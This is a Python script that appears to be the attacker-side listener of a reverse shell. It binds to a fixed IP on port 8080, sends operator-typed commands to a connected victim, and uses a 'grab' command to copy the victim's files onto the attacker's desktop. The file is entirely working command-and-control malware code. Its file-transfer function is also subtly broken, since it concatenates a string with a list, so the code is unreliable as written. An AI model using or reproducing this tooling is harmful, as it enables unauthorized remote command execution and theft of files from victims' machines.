import os
import socket
#  Test if its running netstat -antp | grep 8080
#  on windows netstat -ano

def transfer(conn, command):
        conn.send(command.encode())
        path = command.split("*")
        f=open("/root/Desktop/"+path, "wb")
        while True:
                bits = conn.recv(1024)
                if bits.endswith("DONE".encode()):
                        f.write(bits[:-4])
                        f.close()
                        print("[+] Transfer completed")
                        break
                if "File not found".encode() in bits:
                        print("[-] Unable to find oy the file")
                        break
                f.write(bits)

def connect():
        print("[+] - Attempting to connect to server connection...")
        s = socket.socket()
        s.bind(("10.174.15.6", 8080))
        s.listen(1)
        conn, addr = s.accept()
        print ("[+] We got a connection from",addr)
    
        while True:
                command = input("Shell>")
                if "terminate" in command:
                        conn.send("terminate".encode())
                        conn.close()
                        break
                if command == "":
                        print("You need to enter something!")
                elif 'grab' in command:
                        transfer(conn, command)
                else:
                        conn.send(command.encode())
                        print (conn.recv(1024).decode())
def main():
        connect()
    
main()
    